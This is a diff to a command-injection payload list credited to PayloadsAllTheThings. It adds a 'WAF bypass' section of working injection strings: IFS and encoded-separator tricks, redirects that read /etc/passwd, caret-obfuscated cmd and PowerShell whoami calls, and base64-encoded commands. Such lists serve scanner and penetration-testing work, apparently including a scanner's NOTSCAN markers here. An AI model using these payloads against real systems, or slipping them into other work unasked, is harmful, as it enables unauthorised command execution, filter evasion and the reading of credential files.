@@ -1,6 +1,6 @@
 # Command Injection payloads
 # Source: https://github.com/swisskyrepo/PayloadsAllTheThings
-# Total: 543 payloads
+# Total: 578 payloads
 ;id
 ;id;
 `id`
@@ -546,3 +546,46 @@ $(cat /etc/hostname)
 $(echo NOTSCAN)
 ;printf NOTSCAN
 ;head -n1 /etc/passwd
+
+# --- WAF bypass ---
+# IFS / positional expansion
+;${IFS}id
+|${IFS}id
+&${IFS}id
+;cat${IFS}/etc/passwd
+;cat$@/etc/passwd
+;id$@
+;echo${IFS}notscan_waf
+`id${IFS}`
+# encoded separators / newlines
+%0a%0aid
+%3bid
+%7cid
+%26%26id
+%3b+id
+%3b%09id
+%3b%20id
+\r\nid
+\nid
+# backticks / read-only redirects
+;`id`
+;`ls`;`
+;cat</etc/passwd
+;head</etc/passwd
+;tail</etc/passwd
+;ls</etc
+# PowerShell / cmd obfuscation
+;c^m^d /c whoami
+& c^m^d /c whoami
+;who^ami
+;cmd /c ^w^h^o^a^m^i
+;powershell -NoP -Command whoami
+;powershell.exe -Command "$PSVersionTable"
+# variable expansion
+;a=id;$a
+;a=`id`;$a
+;echo$'\x69\x64'
+# base64 echo (payload string only, no execution)
+;echo aWQK|base64 -d
+;echo${IFS}aWQK|base64${IFS}-d
+;echo d2hvYW1p|base64 -d
